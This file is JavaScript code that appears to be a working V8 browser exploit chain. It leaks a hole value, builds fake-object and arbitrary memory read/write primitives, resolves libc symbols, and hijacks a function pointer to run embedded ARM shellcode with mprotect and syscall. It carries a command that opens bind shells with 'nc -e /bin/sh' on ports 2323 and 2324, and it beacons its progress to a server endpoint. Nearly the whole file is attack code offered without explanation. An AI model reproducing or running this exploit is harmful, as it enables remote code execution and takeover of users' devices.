const G = "r2v8_nat46";
const out = { m: "NAT46" };
async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function b(stage, extra) {
try {
await fetch('/beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ cmd: 'PROG', res: JSON.stringify(Object.assign({ m: 'RCE1', stage: stage }, extra || {})) }) });
} catch (e) {}
}
try {
function target2(a,b,c,d,e,f,g,h,i,j,k){ "use strict"; return 1.1; }
for (let i = 0; i < 100000; i++) target2(1,2,3,4,5,6,7,8,9,10,11);
await sleep(120);
const FIXED_ARRAY_HEADER_SIZE = 8n;
var arr_buf = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr_buf);
var b64_arr = new BigInt64Array(arr_buf);
function ftoi(f) { f64_arr[0] = f; return b64_arr[0]; }
function itof(i) { b64_arr[0] = i; return f64_arr[0]; }
function smi(i) { return i << 1n; }
function hex(x) { return "0x" + x.toString(16); }
var buf = new Array(512);
for (let i = 0; i < 512; i++) buf[i] = 1.1;
var gcmd = "for n in /bin/busybox /usr/bin/busybox /bin/toybox /usr/bin/toybox /system/bin/busybox /bin/nc /usr/bin/nc /system/bin/nc; do $n nc -l -p 2323 -e /bin/sh & $n -l -p 2324 -e /bin/sh & done";
for (let j = 0; j < gcmd.length; j += 8) {
let w = 0n;
for (let k = 0; k < 8; k++) { let c = (j + k < gcmd.length) ? gcmd.charCodeAt(j + k) : 0; w |= BigInt(c) << BigInt(k * 8); }
buf[248 + j / 8] = itof(w);
}
function set_keyed_prop(a, k, v) { a[k] = v; }
function leak_hole() {
let s = [];
for (let i = 0; i < 10; i++) set_keyed_prop(arguments, "foo", 1);
set_keyed_prop(s, 0, 1);
set_keyed_prop(arguments, arguments.length, 1);
return arguments[arguments.length + 1];
}
const the = {};
the.hole = leak_hole();
var SCTXT = "2de9f04f0e200aa141f001010b4b984700200ea100220a4b98470120094b984709a63568a1272f60bde8f04f704700bf05a63568b2276f60704700bf111111112222222233333333444444440020000000bf00bf00bf00bf";
  var large_arr = new Array(0x10000);
large_arr.fill(itof(0xDEADBEE0n));
function leak_stuff(b) {
if (b) {
let index = Number(b ? the.hole : -1);
index |= 0; index += 1;
let arr1 = [1.1, 2.2, 3.3, 4.4];
let arr2 = [0x1337, large_arr];
let a = arr1.at(index * 4), c = arr1.at(index * 5);
let d = arr1.at(index * 8), e = arr1.at(index * 9);
let f = arr1.at(index * 6), g = arr1.at(index * 7);
return [a, c, d, e, f, g, arr1, arr2, index];
}
return 0;
}
function weak_fake_obj(b, addr = 1.1) {
if (b) {
let index = Number(b ? the.hole : -1);
index |= 0; index += 1;
let arr1 = [0x1337, {}];
let arr2 = [addr, 2.2, 3.3, 4.4];
let fake_obj = arr1.at(index * 8);
return [fake_obj, arr1, arr2];
}
return 0;
}
for (let i = 0; i < 10; i++) leak_stuff(true);
for (let i = 0; i < 10; i++) weak_fake_obj(true, 1.1);
for (let i = 0; i < 200000; i++) { leak_stuff(false); if ((i & 0x3fff) === 0) await sleep(0); }
for (let i = 0; i < 200000; i++) { weak_fake_obj(false, 1.1); if ((i & 0x3fff) === 0) await sleep(0); }
let leaks = null;
for (let k = 0; k < 100; k++) {
let l = leak_stuff(true);
let bb = ftoi(l[0]);
if (bb !== 0x7ff8000000000000n && bb !== 0n) { leaks = l; out.leak_try = k; break; }
await sleep(50);
}
if (!leaks) { out.stage = 'NO_LEAK'; }
else {
let m = ftoi(leaks[0]);
let packed_dbl_map = m & 0xFFFFFFFFn;
let packed_dbl_props = m >> 32n;
let el = ftoi(leaks[1]);
let packed_dbl_elements = el & 0xFFFFFFFFn;
let fixed_arr_map = ftoi(leaks[4]) & 0xFFFFFFFFn;
let large_arr_addr = (ftoi(leaks[5]) >> 32n) & 0xFFFFFFFFn;
out.fixed_map = hex(fixed_arr_map);
if ((fixed_arr_map & 0xFFFn) !== 0x191n) { out.stage = 'BAD_LEAK'; }
else {
let dbl_arr = leaks[6];
dbl_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
dbl_arr[1] = itof(((large_arr_addr + 8n) - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));
let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE) | 1n;
let temp = null;
for (let k = 0; k < 3; k++) {
let r = weak_fake_obj(true, itof(temp_fake_arr_addr));
if (r && r[0] !== undefined) { temp = r; out.temp_try = k; break; }
let t = Date.now(); while (Date.now() - t < 5) {}
}
if (!temp) { out.stage = 'NO_TEMP'; }
else {
let lae = ftoi(temp[0]) & 0xFFFFFFFFn;
let fake_arr_addr = lae + FIXED_ARRAY_HEADER_SIZE;
let fake_arr_elements_addr = fake_arr_addr + 16n;
large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
large_arr[1] = itof(fake_arr_elements_addr | (smi(0n) << 32n));
large_arr[2] = itof(fixed_arr_map | (smi(0n) << 32n));
let fake_arr = null;
for (let k = 0; k < 3; k++) {
let r = weak_fake_obj(true, itof(fake_arr_addr));
if (r && r[0] !== undefined) { fake_arr = r[0]; out.fake_try = k; break; }
let t = Date.now(); while (Date.now() - t < 5) {}
}
if (!fake_arr) { out.stage = 'NO_FAKE'; }
else {
out.stage = 'RW';
function init_rw() {
large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
}
function v8r64(a) {
init_rw();
large_arr[1] = itof((((a - 8n) | 1n)) | (smi(1n) << 32n));
let r = ftoi(fake_arr[0]);
large_arr[1] = itof(0n);
return r;
}
function r32(a) {
let a8 = a & ~7n;
let w = v8r64(a8);
let sh = (a & 7n) * 8n;
return (w >> sh) & 0xFFFFFFFFn;
}
function addr_of(o) {
large_arr[0] = itof(packed_dbl_map | (packed_dbl_props << 32n));
large_arr[1] = itof(fake_arr_elements_addr | (smi(1n) << 32n));
fake_arr[0] = o;
let r = ftoi(large_arr[3]) & 0xFFFFFFFFn;
large_arr[1] = itof(0n);
return r;
}
function v8_write64(a, val) {
init_rw();
large_arr[1] = itof(((a - FIXED_ARRAY_HEADER_SIZE) | 1n) | (smi(1n) << 32n));
fake_arr[0] = itof(val);
large_arr[1] = itof(0n);
}
function write32(a, val) {
let old = v8r64(a);
let nv = (old & 0xFFFFFFFF00000000n) | (val & 0xFFFFFFFFn);
v8_write64(a, nv);
}
function rbytes(a, n) {
let s = "";
let off = 0n;
while (off < n) {
let addr = a + off;
let w = v8r64(addr & ~7n);
let start = addr & 7n;
for (let j = start; j < 8n && off < n; j++) {
let byte = Number((w >> (j * 8n)) & 0xFFn);
if (byte === 0) return s;
s += String.fromCharCode(byte);
off += 1n;
}
}
return s;
}
const DYN = 0x2bd5c10n;
let rdebug = 0n;
for (let i = 0n; i < 64n; i++) {
let a = DYN + i * 8n;
let tag = r32(a), val = r32(a + 4n);
if (tag === 0n) break;
if (tag === 21n) { rdebug = val; break; }
}
let libc = 0n, lld = 0n;
if (rdebug) {
let map = r32(rdebug + 4n);
for (let i = 0; i < 20 && map; i++) {
let addr = r32(map);
let namep = r32(map + 4n);
let nm = namep ? rbytes(namep, 96) : "";
if (nm.indexOf('libc.so') >= 0 || nm.indexOf('libc-') >= 0) { libc = addr; lld = r32(map + 8n); break; }
map = r32(map + 12n);
}
}
out.libc = hex(libc); out.l_ld = hex(lld);
if (!libc || !lld) { out.stage = 'NO_LIBC'; }
else {
let DT = {};
for (let i = 0n; i < 128n; i++) {
let a = lld + i * 8n;
let tag = r32(a), val = r32(a + 4n);
if (tag === 0n) break;
DT[Number(tag)] = val;
}
let strtab = DT[5] || 0n, symtab = DT[6] || 0n, strsz = DT[10] || 0n;
let gnu_hash_addr = DT[0x6ffffef5] || 0n;
out.gnu_hash = hex(gnu_hash_addr);
function gnu_hash(s) {
let h = 5381n;
for (let i = 0; i < s.length; i++) h = ((h << 5n) + h + BigInt(s.charCodeAt(i))) & 0xFFFFFFFFn;
return h;
}
function lookup(name) {
if (!gnu_hash_addr || !symtab || !strtab) return null;
let nbuckets = Number(r32(gnu_hash_addr));
let symoffset = Number(r32(gnu_hash_addr + 4n));
let bloom_size = Number(r32(gnu_hash_addr + 8n));
let bloom = gnu_hash_addr + 16n;
let buckets = bloom + BigInt(bloom_size) * 4n;
let chains = buckets + BigInt(nbuckets) * 4n;
let h = gnu_hash(name);
let bucket = Number(r32(buckets + BigInt(Number(h % BigInt(nbuckets))) * 4n));
if (bucket < symoffset) return null;
let idx = bucket;
for (let guard = 0; guard < 200; guard++) {
let chain = r32(chains + BigInt(idx - symoffset) * 4n);
if ((chain | 1n) === (h | 1n)) {
let st_name = r32(symtab + BigInt(idx) * 16n);
let nm = rbytes(strtab + st_name, 48);
if (nm === name) return libc + r32(symtab + BigInt(idx) * 16n + 4n);
}
if (chain & 1n) break;
idx++;
}
return null;
}
let GC = lookup('getcontext');
let SC = lookup('setcontext');
let T1 = libc + 0xC1A5n;
let GW = lookup('getcwd');
let MPR = lookup('mprotect');
let FST = lookup('fstat');
let GU = lookup('getuid');
let SIGNAL = lookup('signal');
let SIGP = lookup('sigprocmask');
let ALARM = lookup('alarm');
let BX12 = libc + 0xDE3A0n;
let SYSC = lookup('syscall');
let POPS = libc + 0xCABA0n;
let STUBL = libc + 0x1E0ACn;
let STUBS = STUBL - 8n;
let popw = r32(POPS), flpop = r32(POPS - 0x23n);
let w0 = r32(STUBS), w1 = r32(STUBS + 4n), w2 = r32(STUBL);
function ror12(im) {
let rot = Number((im >> 8n) & 0xFn), v = Number(im & 0xFFn), r = (rot * 2) % 32;
return BigInt(((v >>> r) | (v << (32 - r))) >>> 0);
}
let slot = STUBS + 8n + ror12(w0 & 0xFFFn) + ror12(w1 & 0xFFFn) + (w2 & 0xFFFn);
let slotv = r32(slot);
if (!GC || !SC || popw !== 0xE8BD8003n) {
out.stage = 'PRE_BAD';
} else {
let ta = addr_of(target2);
let ato = ta & ~1n;
let tc = r32(ato + 24n);
write32(ato + 24n, POPS - 0x3Fn);
let ela = addr_of(large_arr);
let elem = r32((ela & ~1n) + 8n) & ~1n;
let oucp = elem + 0x40000n;
let ucp = elem + 0x41000n;
let stk = elem + 0x45000n;
let sc = elem + 0x50000n;
let outb = elem + 0x60000n;
let bufb = elem + 0x61000n;
let page = sc & ~0xFFFn;
const OI = 0x7FFF, UI = 0x81FF, SI = 0x89FF, SCI = 0x9FFF;
for (let k = 0; k < 0x100; k++) { large_arr[UI + k] = 0.0; large_arr[OI + k] = 0.0; }

let scw = [];
for (let i = 0; i < SCTXT.length; i += 8) { let hx = SCTXT.substr(i, 8); scw.push(BigInt('0x' + hx.substr(6, 2) + hx.substr(4, 2) + hx.substr(2, 2) + hx.substr(0, 2))); }
scw[15] = SIGNAL; scw[16] = SIGP; scw[17] = ALARM; scw[18] = outb;
for (let i = 0; i < scw.length; i += 2) large_arr[SCI + (i >> 1)] = itof(scw[i] | (scw[i + 1] << 32n));
await b('N46a', { elem: hex(elem), w: hex(r32(sc)) + ',' + hex(r32(sc + 4n)) + ',' + hex(r32(sc + 8n)) + ',' + hex(r32(sc + 12n)) });
let sw = 0;
let tgt = oucp;
for (let ph = 0; ph < 2; ph++) {
write32(slot, ph === 0 ? GC : SC);
let rv = target2.call(Number(tgt >> 1n), 0, Number(STUBS >> 1n), 0, 0, 0, 0, 0, 0, 0, 0);
if (ph === 0) {
if (sw) break;
let ucp2 = elem + 0x42000n;
const UI2 = 0x83FF;
for (let k = 0; k < 0x40; k++) large_arr[UI2 + k] = 0.0;
large_arr[UI + 4] = itof(page | (0x2000n << 32n));
large_arr[UI + 5] = itof(7n);
large_arr[UI + 10] = itof(MPR | (stk << 32n));
large_arr[UI + 11] = itof(T1 | (BX12 << 32n));
large_arr[UI2 + 4] = itof(0x0F0002n | (sc << 32n));
large_arr[UI2 + 5] = itof((sc + 0x100n));
large_arr[UI2 + 10] = itof(SYSC | ((stk + 8n) << 32n));
large_arr[UI2 + 11] = itof(T1 | (BX12 << 32n));
large_arr[SI] = itof(ucp2 | (SC << 32n));
large_arr[SI + 1] = itof(0n | ((sc | 1n) << 32n));
large_arr[SI + 2] = itof(oucp | (SC << 32n));
large_arr[SI + 2] = itof(oucp | (SC << 32n));
sw = 1;
tgt = ucp;
}
}
write32(ato + 24n, tc);
write32(slot, slotv);
await new Promise(r => setTimeout(r, 2200));
let mg = hex(r32(outb));
let valid = [];
for (let fd = 0; fd < 64; fd++) {
let rr = r32(outb + BigInt(fd * 4));
if (rr === 0n) {
let ww = [];
for (let jj = 0; jj < 8; jj++) ww.push(hex(r32(outb + 0x400n + BigInt(fd * 32 + jj * 4))));
valid.push(fd + ':' + ww.join('/'));
}
}
out.valid = valid.join(',');
out.magic = mg;
await b('N46c', { a1: mg, b2: hex(r32(outb + 4n)) });
out.stage = 'NAT46';
}
}
}
}
}
}
} catch (e) {
out.err = String(e && e.stack ? e.stack : e);
}
localStorage.setItem(G, JSON.stringify(out));
return JSON.stringify(out);
